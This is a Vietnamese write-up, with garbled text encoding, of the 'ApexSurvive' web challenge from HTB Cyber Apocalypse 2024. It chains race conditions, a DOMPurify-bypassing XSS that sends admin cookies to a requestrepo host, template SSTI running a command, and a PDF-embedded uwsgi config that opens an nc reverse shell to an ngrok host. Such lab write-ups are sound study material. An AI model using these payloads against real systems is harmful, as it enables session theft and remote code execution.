Ä‘áº¿n upload file python thÃ¬ cÃ¡ch Ä‘áº§u tiÃªn mÃ¬nh nghÄ© Ä‘áº¿n lÃ  upload ghi Ä‘Ã¨ file __init__.py nhÆ°ng web nÃ y láº¡i khÃ´ng cÃ³ nÃªn hÆ°á»›ng Ä‘i Ä‘Ã³ khÃ´ng kháº£ thi cho láº¯m :cry: VÃ¬ má»›i gáº§n Ä‘Ã¢y cÃ³ má»™t bÃ i upload python cÅ©ng na nÃ¡, teammate MacHongNam Ä‘Ã£ gá»£i Ã½ mÃ¬nh cÃ¡ch ghi Ä‘Ã¨ file html vÃ  ssti trong file Ä‘Ã³ Ä‘á»ƒ khi server render_template sáº½ trigger ssti Ä‘á»ƒ RCE. Äiá»u kiá»‡n lÃ  file templates Ä‘Ã³ chÆ°a Ä‘Æ°á»£c render láº§n nÃ o, vÃ¬ render_template sáº½ ghi nhá»› cÃ¡c láº§n render nÃªn náº¿u render lá»—i kháº£ nÄƒng pháº£i cháº¡y láº¡i docker lÃ m láº¡i lÃ  ráº¥t cao MÃ¬nh sáº½ chá»n templates info.html Ä‘Æ°á»£c render á»Ÿ path / Ä‘á»ƒ inject -\u0026gt; trang chá»§ giá»›i thiá»‡u, chá»‰ cáº§n lÃºc Ä‘áº§u mÃ¬nh truy cáº­p tháº³ng vÃ o path /challenge vÃ  /email lÃ  Ä‘Æ°á»£c\n1 2 3 @challengeInfo.route(\u0026#39;/\u0026#39;) def info(): return render_template(\u0026#39;info.html\u0026#39;) File sau khi Ä‘Æ°á»£c upload sáº½ lÆ°u vÃ o /tmp/temporaryUpload rá»“i má»›i Ä‘Æ°á»£c check, sau khi check thÃ nh cÃ´ng ná»™i dung Ä‘Æ°á»£c Ä‘Æ°a vÃ o folder contracts hoáº·c lÃ  tráº£ vá» thÃ´ng bÃ¡o invalid PDF. =\u0026gt; Pháº£i máº¥t 2 láº§n ghi file thÃ¬ file má»›i Ä‘Æ°á»£c ghi thÃ nh cÃ´ng, mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ lá»£i dá»¥ng lÃºc file pdf Ä‘ang Ä‘Æ°á»£c check Ä‘á»ƒ upload 1 file html ná»¯a tháº¿ chá»— file pdf cÅ© =\u0026gt; race condition, sau Ä‘Ã³ sá»­ dá»¥ng path traversal ghi Ä‘Ã¨ html lÃ  cÃ³ thá»ƒ rce thÃ nh cÃ´ng rá»“i MÃ¬nh báº¯t tay vÃ o viáº¿t script upload file race condition nhÆ°ng báº±ng má»™t lÃ½ do gÃ¬ Ä‘áº¥y mÃ  script cá»§a mÃ¬nh Ä‘á»u ghi Ä‘Ã¨ pdf vÃ o templates thay vÃ¬ file html mÃ  mÃ¬nh mong muá»‘n =))). MÃ¬nh stuck á»Ÿ Ä‘Ã¢y cÅ©ng pháº£i 2 tiáº¿ng trÆ°á»›c khi quyáº¿t Ä‘á»‹nh mÃ©o dÃ¹ng script python ná»¯a mÃ  chuyá»ƒn qua xÃ i Burp Repeater cho nÃ³ nhanh. Server check pdf cháº·t nÃªn mÃ¬nh sáº½ gá»­i 1 pdf valid láº¥y máº«u request, vÃ  file html mÃ¬nh copy nguyÃªn tá»« tháº±ng gá»‘c vÃ  nhÃ©t thÃªm dÃ²ng:\n1 {% print(namespace.__init__.__globals__.os.popen(\u0026#39;/readflag\u0026#39;).read()) %} Thay Ä‘á»•i tÃªn file cá»§a cÃ¡c file html thÃ nh /app/application/templates/info.html, mÃ¬nh gá»­i Ä‘i cÃ¹ng lÃºc 1 req upload pdf vÃ  6 req upload html Sau má»™t há»“i spam Ctrl Space thÃ¬ mÃ¬nh Ä‘Ã£ ghi Ä‘Ã¨ Ä‘Æ°á»£c file info.html Khai thÃ¡c thÃ nh cÃ´ng!! Tuy ráº±ng Ä‘Ã£ cÃ³ thá»ƒ khai thÃ¡c thÃ nh cÃ´ng, nhÆ°ng mÃ¬nh váº«n chÆ°a tÃ¬m Ä‘Æ°á»£c cÃ¡ch nÃ o Ä‘á»ƒ cÃ³ thá»ƒ lÃªn Ä‘Æ°á»£c admin, cÃ¹ng lÃºc nÃ y teammate MacHongNam báº£o mÃ¬nh hÃ£y nghÄ© cÃ¡ch Ä‘á»ƒ lÃªn Ä‘Æ°á»£c isInternal nháº±m sá»­ dá»¥ng api /addItem, vÃ¬ mÃ¬nh cÃ³ thá»ƒ dom based XSS táº¡i endpoint /product/product-id\nBypass sanitized input to trigger XSS Nghe nhÆ° váº­y thÃ¬ mÃ¬nh Ä‘Ã£ tÃ¬m Ä‘áº¿n path addProduct Ä‘á»ƒ thÃªm sáº£n pháº©m, khi Ä‘á»c Ä‘áº¿n product.html thÃ¬ mÃ¬nh Ä‘Ã£ tháº¥y vÃ¬ sao cÃ³ thá»ƒ dom based XSS:\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let note = `{{ product.note | safe }}`; const clean = DOMPurify.sanitize(note, {FORBID_ATTR: [\u0026#39;id\u0026#39;, \u0026#39;style\u0026#39;], USE_PROFILES: {html:true}}); document.getElementById(\u0026#39;note\u0026#39;).innerHTML += clean; \u0026lt;/script\u0026gt; Note lÃ  má»™t thuá»™c tÃ­nh mÃ  mÃ¬nh control khi addProduct -\u0026gt; sá»­ dá»¥ng backtick escape khá»i Ä‘oáº¡n khai bÃ¡o note -\u0026gt; XSS: Káº¿t há»£p vá»›i viá»‡c cÃ³ thá»ƒ report cho admin vá» cÃ¡c product, mÃ¬nh cÃ³ payload sau Ä‘á»ƒ láº¥y session cá»§a admin:\n1 `;fetch(\u0026#34;https://9vja3pan.requestrepo.com/?\u0026#34;+document.cookie);// Bypass isInternal with race condition Tiáº¿p tá»¥c vÃ¹i Ä‘áº§u vÃ o Ä‘á»‘ng source code, mÃ¬nh tháº¥y Ä‘Æ°á»£c á»Ÿ Ä‘oáº¡n verifyEmail, email Ä‘Æ°á»£c tÃ¡ch ra thÃ nh tÃªn vÃ  hostname, kiá»ƒu a@gmail.com thÃ¬ tÃªn lÃ  a vÃ  hostname lÃ  gmail.com. Náº¿u nhÆ° hostname cá»§a mÃ¬nh lÃ  apexsurvive.htb thÃ¬ database sáº½ set isInternal=\u0026ldquo;true\u0026rdquo;, Ä‘Ã¢y chÃ­nh lÃ  chá»— mÃ¬nh cáº§n pháº£i exploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def verifyEmail(token): user = query(\u0026#39;SELECT * from users WHERE confirmToken = %s\u0026#39;, (token, ), one=True) if user and user[\u0026#39;isConfirmed\u0026#39;] == \u0026#39;unverified\u0026#39;: _, hostname = parseaddr(user[\u0026#39;unconfirmedEmail\u0026#39;])[1].split(\u0026#39;@\u0026#39;, 1) if hostname == \u0026#39;apexsurvive.htb\u0026#39;: query(\u0026#39;UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail=\u0026#34;\u0026#34;, confirmToken=\u0026#34;\u0026#34;, isInternal=\u0026#34;true\u0026#34; WHERE id=%s\u0026#39;, (\u0026#39;verified\u0026#39;, user[\u0026#39;unconfirmedEmail\u0026#39;], user[\u0026#39;id\u0026#39;],)) else: query(\u0026#39;UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail=\u0026#34;\u0026#34;, confirmToken=\u0026#34;\u0026#34; WHERE id=%s\u0026#39;, (\u0026#39;verified\u0026#39;, user[\u0026#39;unconfirmedEmail\u0026#39;], user[\u0026#39;id\u0026#39;],)) mysql.connection.commit() return True return False Ngáº·t nghÃ¨o á»Ÿ chá»— lÃ  trang email cá»§a chÃºng ta chá»‰ nháº­n email gá»­i Ä‘áº¿n test@email.htb :cry:. Sau khi báº¿\u0026rsquo;s táº¯c má»™t khoáº£ng thá»i gian khÃ¡ lÃ¢u thÃ¬ teammate ChÆ°Æ¡ng tÃ¬m ra Ä‘Æ°á»£c cÃ¡ch Ä‘á»ƒ nháº­n Ä‘Æ°á»£c email cá»§a tÃ i khoáº£n cÃ³ hostname apexsurvive.htb lÃ  race condition:\nKhi chá»‰nh sá»­a profile tá»« má»™t email Ä‘Ã£ verify thÃ nh má»™t email khÃ¡c, server sáº½ tá»± gá»­i token Ä‘áº¿n email Ä‘Ã³ 1 2 3 4 5 6 @api.route(\u0026#39;/profile\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) ... if result: if result == \u0026#39;email changed\u0026#39;: sendEmail(decodedToken.get(\u0026#39;id\u0026#39;), email) return response(\u0026#39;Profile updated!\u0026#39;) API sendVerification cho biáº¿t server sáº½ láº¥y thÃ´ng tin cá»§a user Ä‘Ã³, kiá»ƒm tra xem user Ä‘Ã£ Ä‘Æ°á»£c confirm email chÆ°a, náº¿u chÆ°a sáº½ gá»­i token Ä‘áº¿n email Ä‘Ã³ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @api.route(\u0026#39;/sendVerification\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @isAuthenticated @sanitizeInput def sendVerification(decodedToken): user = getUser(decodedToken.get(\u0026#39;id\u0026#39;)) if user[\u0026#39;isConfirmed\u0026#39;] == \u0026#39;unverified\u0026#39;: if checkEmail(user[\u0026#39;unconfirmedEmail\u0026#39;]): sendEmail(decodedToken.get(\u0026#39;id\u0026#39;), user[\u0026#39;unconfirmedEmail\u0026#39;]) return response(\u0026#39;Verification link sent!\u0026#39;) else: return response(\u0026#39;Invalid Email\u0026#39;) return response(\u0026#39;User already verified!\u0026#39;) -\u0026gt; CÃ³ thá»ƒ race condition save profile 2 email, Ä‘á»“ng thá»i sendVerification Ä‘á»ƒ yÃªu cáº§u gá»­i token Ä‘áº¿n email, tá»« Ä‘Ã³ ghi Ä‘Ã¨ ná»™i dung server gá»­i cho test@email.htb thÃ nh cá»§a test@apexsurvive.htb, tá»« Ä‘Ã³ láº¥y token cá»§a email test@apexsurvive.htb Ä‘i verify lÃ  Ä‘Æ°á»£c isInternal=true.\nComplete the attack chain \u0026amp; Exploit CÃ¡c bÆ°á»›c táº¥n cÃ´ng Ä‘Ã£ Ä‘áº§y Ä‘á»§, nÃªn mÃ¬nh sáº½ tá»•ng há»£p láº¡i nhÆ° sau:\nRace condition verify email -\u0026gt; bypass isInternal Dom Based XSS táº¡i /addProduct -\u0026gt; láº¥y session admin/ bypass admin Race condition upload file -\u0026gt; RCE Attack chain cÃ³ táº­n 2 láº§n race condition nÃªn viá»‡c cÃ³ thá»ƒ solve nhanh hay cháº­m nÃ³ phá»¥ thuá»™c vÃ o may máº¯n khÃ¡ nhiá»u =)), sau khi rÃµ hÆ°á»›ng thÃ¬ mÃ¬nh deploy web rá»“i lÃ m luÃ´n vÃ  theo nhÆ° mÃ¬nh tháº¥y thÃ¬ race verify email lÃ  cÃ´ng Ä‘oáº¡n lÃ¢u nháº¥t.\nBypass isInternal MÃ¬nh tiáº¿p tá»¥c sá»­ dá»¥ng Burp Repeater Ä‘á»ƒ race condition email, vá»›i 3 req sendVerification, 1 req update profile test@email.htb vÃ  1 req test@apexsurvive.htb: Cuá»‘i cÃ¹ng cÅ©ng cÃ³ token cÃ³ thá»ƒ verify :cry: Bypass admin Sá»­ dá»¥ng payload bÃªn trÃªn vÃ  report product id, mÃ¬nh cÃ³ admin token: Äáº¿n giá» truy cáº­p admin Ä‘á»ƒ RCE rá»“i Upload file MÃ¬nh lÃ m y há»‡t nhÆ° á»Ÿ trÃªn local vÃ  lá»¥m Ä‘Æ°á»£c flag cá»§a challenge: Flag: HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3} P/s: Sau khi lÃ m xong mÃ¬nh má»›i tháº¥y lÃ  náº¿u nhÆ° render ra pdf thÃ¬ trang web sáº½ bá»‹ lá»—i vÃ  khÃ´ng lÆ°u láº¡i template Ä‘Ã³ nÃªn mÃ¬nh cÃ³ thá»ƒ tiáº¿p tá»¥c race mÃ  khÃ´ng pháº£i redeploy challenge.\nAnother workaround to bypass PDF upload Sau khi Ä‘i táº£n máº¡n write up cá»§a má»i ngÆ°á»i, mÃ¬nh cÃ³ tÃ¬m Ä‘Æ°á»£c bÃ i write up nÃ y cÃ³ má»™t solution khÃ¡c Ä‘á»ƒ trigger RCE thÃ´ng qua upload file: https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/ ÄÃ¢y lÃ  má»™t cÃ¡ch ráº¥t hay khi server uwsgi dÃ­nh lá»—i arbitary PDF upload, cá»¥ thá»ƒ lÃ  nháº±m vÃ o file uwgsi.ini (Chi tiáº¿t á»Ÿ document): https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html\nuwsgi cÃ³ kháº£ nÄƒng Ä‘á»c file config cá»§a chÃ­nh nÃ³ ká»ƒ cáº£ khi file dÆ°á»›i dáº¡ng binary, miá»…n sao nÃ³ tÃ¬m Ä‘Æ°á»£c chuá»—i báº¯t Ä‘áº§u khai bÃ¡o config há»£p lá»‡: [uwsgi] uwsgi sá»­ dá»¥ng operator @ vÃ  cÃ¡c scheme Ä‘á»ƒ há»— trá»£ include, Ä‘á»c file vÃ  call cÃ¡c function, trong Ä‘Ã³ cÃ³ scheme exec dÃ¹ng Ä‘á»ƒ thá»±c thi cÃ¢u lá»‡nh -\u0026gt; Thá»© mÃ¬nh cáº§n dÃ¹ng: 1 2 3 [uwsgi] ; read from a process stdout body = @(exec://whoami) Viá»‡c táº¥n cÃ´ng vÃ o file ini sáº½ cáº§n má»™t yáº¿u tá»‘ quan trá»ng khÃ¡c: LÃ m tháº¿ nÃ o Ä‘á»ƒ uwsgi reload láº¡i config cá»§a chÃ­nh nÃ³? Äiá»u nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c giáº£i quyáº¿t náº¿u nhÆ° uwsgi config sáºµn chá»©c nÄƒng dÃ¹ng Ä‘á»ƒ debug py-auto-reload, náº¿u nhÆ° phÃ¡t hiá»‡n sá»± thay Ä‘á»•i cá»§a cÃ¡c file trong server thÃ¬ config sáº½ Ä‘Æ°á»£c reload. Viá»‡c upload file PDF lÃ  chÆ°a Ä‘á»§, nÃªn sau Ä‘Ã³ mÃ¬nh cáº§n pháº£i ghi Ä‘Ã¨ má»™t file .py thÃ¬ server má»›i reload láº¡i config, tá»« Ä‘Ã³ trigger RCE.\n1 py-autoreload = 3 Document cÅ©ng cÃ³ luÃ´n cáº£ POC nÃªn mÃ¬nh sáº½ sá»­a Ä‘á»ƒ Ä‘á»•i thÃ nh payload reverse shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from fpdf import FPDF from exiftool import ExifToolHelper with ExifToolHelper() as et: et.set_tags( [\u0026#34;lmao.jpg\u0026#34;], tags={\u0026#34;model\u0026#34;: \u0026#34;\u0026amp;#x0a;[uwsgi]\u0026amp;#x0a;foo = @(exec://nc 0.tcp.ap.ngrok.io 18726 -e /bin/sh)\u0026amp;#x0a;\u0026#34;}, params=[\u0026#34;-E\u0026#34;, \u0026#34;-overwrite_original\u0026#34;] ) class MyFPDF(FPDF): pass pdf = MyFPDF() pdf.add_page() pdf.image(\u0026#39;./lmao.jpg\u0026#39;) pdf.output(\u0026#39;exploit.pdf\u0026#39;, \u0026#39;F\u0026#39;) LÆ°u Ã½: Náº¿u bÃ¡o lá»—i khÃ´ng cÃ³ module exiftool thÃ¬ mÃ¬nh sáº½ cháº¡y cÃ¢u lá»‡nh 1 python3 -m pip install -U pyexiftool Sau khi gen ra PDF thÃ¬ mÃ¬nh gá»­i Ä‘i Ä‘á»ƒ ghi Ä‘Ã¨ /app/uwsgi.ini Ghi Ä‘Ã¨ tiáº¿p /app/application/database.py Ä‘á»ƒ trigger uwgsi reload láº¡i config Log server thÃ´ng bÃ¡o viá»‡c file database.py Ä‘Ã£ bá»‹ thay Ä‘á»•i, tiáº¿n hÃ nh kill tiáº¿n trÃ¬nh vÃ  khá»Ÿi Ä‘á»™ng láº¡i /app, load láº¡i config Reverse Shell thÃ nh cÃ´ng ","date":"2024-03-15T10:31:07Z","permalink":"https://kev1n1203.github.io/p/htb-cyber-apocalypse-2024/","title":"Cyber Apocalypse 2024 Write Up"}]